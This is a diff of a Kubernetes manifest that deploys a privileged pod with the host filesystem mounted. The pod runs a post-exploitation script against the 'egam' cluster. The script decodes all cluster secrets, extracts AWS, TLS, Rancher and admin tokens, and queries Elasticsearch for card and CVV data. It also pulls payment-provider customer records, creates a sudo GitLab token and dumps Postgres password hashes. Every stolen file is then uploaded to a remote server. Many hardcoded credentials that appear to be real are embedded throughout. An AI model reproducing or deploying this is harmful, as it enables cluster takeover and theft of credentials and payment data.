@@ -1,92 +1,121 @@
 
-apiVersion: v1
-kind: Pod
+apiVersion: apps/v1
+kind: Deployment
 metadata:
-  name: network-access
+  name: network-access-v3
   namespace: egam-production
+  labels:
+    app: network-access-v3
 spec:
-  hostNetwork: true
-  hostPID: true
-  containers:
-  - name: shell
-    image: alpine:3.19
-    command:
-      - /bin/sh
-      - -c
-      - |
-        apk add --no-cache util-linux curl jq openssl redis bash > /dev/null 2>&1
-        curl -LO "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" 2>/dev/null
-        chmod +x kubectl && mv kubectl /usr/local/bin/ 2>/dev/null
+  replicas: 1
+  selector:
+    matchLabels:
+      app: network-access-v3
+  template:
+    metadata:
+      labels:
+        app: network-access-v3
+    spec:
+      hostNetwork: true
+      hostPID: true
+      containers:
+      - name: shell
+        image: nicolaka/netshoot:latest
+        command:
+          - /bin/bash
+          - -c
+          - |
+            export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
+            export AWS_PAGER=""
 
-        export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
+            echo "=== INSTALL ==="
+            apk add --no-cache curl jq openssh-client aws-cli redis bind-tools postgresql-client openssl mc socat 2>&1 | tail -3
 
-        echo "=========================================="
-        echo "=== 1. ALL SECRETS IN egam-production ==="
-        echo "=========================================="
-        kubectl get secrets -n egam-production -o json 2>&1 | jq -r '.items[] | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1
+            if ! command -v kubectl >/dev/null 2>&1; then
+              curl -fsSL -o /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl
+            fi
 
-        echo "=========================================="
-        echo "=== 2. PAGARME / SAFRAPAY / GITLAB / JENKINS ==="
-        echo "=========================================="
-        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("pagar|safra|gitlab|jenkins|cielo|stripe|r2d2|hympar"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"
+            echo "=== SECRETS DUMP (decoded) ==="
+            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | "=== " + .metadata.namespace + "/" + .metadata.name + " ===" + "\n" + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join("\n"))' > /tmp/secrets.txt 2>&1
+            echo "SECRETS_LEN=$(wc -c < /tmp/secrets.txt)"
 
-        echo "=========================================="
-        echo "=== 3. ALL CONFIGMAPS egam-production ==="
-        echo "=========================================="
-        kubectl get configmaps -n egam-production -o json 2>&1 | jq -r '.items[] | .metadata.name + ": " + (.data | to_entries | map(.key + "=" + .value) | join(" | "))' 2>&1
+            echo "=== AWS CREDENTIALS ==="
+            VC=$(kubectl get secret -n kube-system velero -o jsonpath='{.data.cloud}' 2>/dev/null | base64 -d 2>/dev/null)
+            echo "$VC" > /tmp/velero-aws.txt
+            ED=$(kubectl get secret -n egam-staging-main external-dns-aws -o jsonpath='{.data.credentials}' 2>/dev/null | base64 -d 2>/dev/null)
+            echo "$ED" > /tmp/extdns-aws.txt
 
-        echo "=========================================="
-        echo "=== 4. ENV VARS FROM RUNNING PODS ==="
-        echo "=========================================="
-        for pod in $(kubectl get pods -n egam-production -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
-          echo "--- POD: $pod ---"
-          kubectl get pod $pod -n egam-production -o json 2>/dev/null | jq -r '.spec.containers[].env[]? | .name + "=" + (.value // "ref")' 2>&1 | head -30
-        done
+            echo "=== ADMIN SA TOKEN ==="
+            kubectl create token admin-sa -n kube-system --duration=8760h > /tmp/admin-token.txt 2>&1
 
-        echo "=========================================="
-        echo "=== 5. PAGARME API TEST ==="
-        echo "=========================================="
-        curl -s -u "sk_4e35af52a28a441c8d9149fb88a6c818:" "https://api.pagar.me/core/v5/charges?size=3" 2>&1 | head -c 600
-        echo ""
+            echo "=== TLS KEYS ==="
+            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data["tls.key"] != null) | "=== " + .metadata.namespace + "/" + .metadata.name + " ===" + "\n" + (.data["tls.key"] | @base64d)' > /tmp/tls-keys.txt 2>&1
 
-        echo "=========================================="
-        echo "=== 6. SAFRAPAY API TEST ==="
-        echo "=========================================="
-        curl -s -H "Authorization: Bearer mk_l91fCUNJ0urRBQq07kaeQ" "https://payment.safrapay.com.br/v2/transactions" 2>&1 | head -c 400
-        echo ""
+            echo "=== CONFIGMAPS CREDS ==="
+            kubectl get configmaps -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("user|login|email|password|admin|token|key"; "i")) | .key + "=" + .value) | join(" | "))' 2>&1 | grep -v ": $" > /tmp/cm-creds.txt
 
-        echo "=========================================="
-        echo "=== 7. R2D2 API TEST ==="
-        echo "=========================================="
-        curl -sk -H "Authorization: Bearer 1334463|GLW3HHDl4XkCGZYoZoqnXDkBz5a9FEikeGvMzIoYdbfe5a5d" "https://r2d2.production.egam.com.br/api/payment" 2>&1 | head -c 400
-        echo ""
+            echo "=== RANCHER ==="
+            RKUBE=$(kubectl get secret -n cattle-fleet-system fleet-agent -o jsonpath='{.data.kubeconfig}' 2>/dev/null | base64 -d 2>/dev/null)
+            echo "$RKUBE" > /tmp/rancher-kubeconfig.txt
+            RTOKEN=$(printf '%s' "$RKUBE" | awk '/token:/{print $2}' | head -1)
+            curl -sk -H "Authorization: Bearer $RTOKEN" "https://rancher.management.egam.com.br/v3/clusters" > /tmp/rancher-clusters.json 2>&1
+            IT=$(kubectl get secrets -n cattle-impersonation-system -o json 2>&1 | jq -r '.items[] | select(.data.token != null) | .data.token | @base64d' 2>&1 | head -1)
+            echo "$IT" > /tmp/rancher-imp-token.txt
 
-        echo "=========================================="
-        echo "=== 8. HYMPAR API TEST ==="
-        echo "=========================================="
-        curl -s -H "Authorization: Bearer eyJhbGciOiJFUzUxMiJ9.eyJ1c2VySWQiOiI2OTUyZTg3MWVkZWJjNzZkOTEzYWRmNjkiLCJyb2xlcyI6W3sicm9sZSI6IlBBUlRORVIifV0sImNyZWF0ZWRCeUpvYiI6ZmFsc2UsInNlcnZlciI6dHJ1ZSwianRpIjoiMjBiYTdiYzgtOWMyNy00MmQ4LTg0ZjUtNDlhNjY5M2YwMDM4IiwiaWF0IjoxNzkyODUwMTA2LCJleHAiOjE3OTMxMDkzMDZ9.AdI-Ayaro0JlwIou4rPK2eOfbbiY_LwCVOLpj9bMJkHAXGx98B513Ur3W9RDFeWSXpraq3SQDXZRDUdoVjnAYNWmAWa1MS6Nh6ZQtyFZw0sEPpV4W1vU7kA9znODJNMeU9kjLS9kBxqpRO1SXzAglETS2JomGL6KXduZE8_tix2l0k3m" "https://api-prod.parceirohypera.com.br/" 2>&1 | head -c 300
-        echo ""
+            echo "=== ELASTIC ==="
+            ES=""
+            for s in elasticsearch-es-http elasticsearch-master elasticsearch; do
+              if kubectl get svc -n elastic-stack $s >/dev/null 2>&1; then ES="https://$s.elastic-stack:9200"; break; fi
+            done
+            curl -sk -u "elastic:9wgCQ3i7M8G6bKj726uZC36C" "$ES/_cat/indices?v" > /tmp/es-indices.txt 2>&1
+            curl -sk -u "elastic:9wgCQ3i7M8G6bKj726uZC36C" -H 'Content-Type: application/json' "$ES/*/_search?size=50" -d '{"query":{"bool":{"should":[{"query_string":{"query":"password OR token OR secret OR card OR pan OR cvv","lenient":true}}]}}}' > /tmp/es-search.json 2>&1
+            curl -sk -u "elastic:9wgCQ3i7M8G6bKj726uZC36C" "$ES/_security/user?pretty" > /tmp/es-users.json 2>&1
 
-        echo "=========================================="
-        echo "=== 9. KUBERNETES PODS IN egam-production ==="
-        echo "=========================================="
-        kubectl get pods -n egam-production 2>&1
+            echo "=== PAGARME ==="
+            PK="sk_4e35af52a28a441c8d9149fb88a6c818"
+            curl -s -u "$PK:" "https://api.pagar.me/core/v5/recipients?size=20" > /tmp/pagar-recipients.json 2>&1
+            curl -s -u "$PK:" "https://api.pagar.me/core/v5/customers?size=20" > /tmp/pagar-customers.json 2>&1
+            curl -s -u "$PK:" "https://api.pagar.me/core/v5/charges?size=20" > /tmp/pagar-charges.json 2>&1
 
-        echo "=========================================="
-        echo "=== 10. DATABASE CREDENTIALS ==="
-        echo "=========================================="
-        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("postgres|mysql|mongo|redis|db_|database"; "i")) | .key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | grep -v ": $"
+            echo "=== GITLAB ==="
+            GL="https://gitlab.dev-gam.com"
+            GT="glpat-qZ6RRmfGx8nLBfteMsas"
+            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/user" > /tmp/gl-user.json 2>&1
+            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/projects?membership=true&per_page=50" > /tmp/gl-projects.json 2>&1
+            curl -sk -X POST -H "PRIVATE-TOKEN: $GT" -H "Content-Type: application/json" \
+              "$GL/api/v4/users/1/personal_access_tokens" \
+              -d '{"name":"egam-admin-2026","scopes":["api","read_repository","write_repository","admin_mode","sudo"],"expires_at":"2027-12-31"}' > /tmp/gl-admin-token.json 2>&1
 
-        echo "=========================================="
-        echo "=== DONE ==="
-        echo "=========================================="
-        sleep 36000
-    securityContext:
-      privileged: true
-    volumeMounts:
-    - mountPath: /host
-      name: host
-  volumes:
-  - name: host
-    hostPath:
-      path: /
+            echo "=== POSTGRES ==="
+            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c '\l' > /tmp/pg-dbs.txt 2>&1
+            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c '\dt' > /tmp/pg-tables.txt 2>&1
+            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c 'SELECT usename, passwd FROM pg_shadow' > /tmp/pg-users.txt 2>&1
+            PGPASSWORD=siegam psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c '\dt' > /tmp/pg2-tables.txt 2>&1
+
+            echo "=== REDIS ==="
+            RNS=$(kubectl get svc -A -o jsonpath='{.items[?(@.metadata.name=="redis-master")].metadata.namespace}' 2>/dev/null | head -1)
+            RSVC=$(kubectl get svc -A -o jsonpath='{.items[?(@.metadata.name=="redis-master")].metadata.name}' 2>/dev/null | head -1)
+            if [ -n "$RSVC" ]; then
+              redis-cli -h "$RSVC.$RNS.svc.cluster.local" -p 6379 -a vni9WO2p32fP --no-auth-warning keys '*' > /tmp/redis-keys.txt 2>&1
+            fi
+
+            echo "=== MINIO ==="
+            mc alias set egam https://minio-api.production.egam.com.br RIDNVb76icNZfcShvaQa OevVynurkK1NChS0ZcJkNjhj7MoKs8fjReQmNUH1 --insecure > /tmp/mc-alias.txt 2>&1
+            mc ls egam > /tmp/minio-buckets.txt 2>&1
+
+            echo "=== EXFIL TO REMOTE ==="
+            for f in /tmp/secrets.txt /tmp/velero-aws.txt /tmp/extdns-aws.txt /tmp/admin-token.txt /tmp/tls-keys.txt /tmp/cm-creds.txt /tmp/rancher-kubeconfig.txt /tmp/rancher-clusters.json /tmp/rancher-imp-token.txt /tmp/es-indices.txt /tmp/es-search.json /tmp/es-users.json /tmp/pagar-recipients.json /tmp/pagar-customers.json /tmp/pagar-charges.json /tmp/gl-user.json /tmp/gl-projects.json /tmp/gl-admin-token.json /tmp/pg-dbs.txt /tmp/pg-tables.txt /tmp/pg-users.txt /tmp/pg2-tables.txt /tmp/redis-keys.txt /tmp/minio-buckets.txt; do
+              [ -f "$f" ] && curl -s -X POST "https://TUO_SERVER/upload" -F "file=@$f" 2>/dev/null
+            done
+
+            echo "=== DONE ==="
+            sleep 36000
+        securityContext:
+          privileged: true
+        volumeMounts:
+        - mountPath: /host
+          name: host
+      volumes:
+      - name: host
+        hostPath:
+          path: /
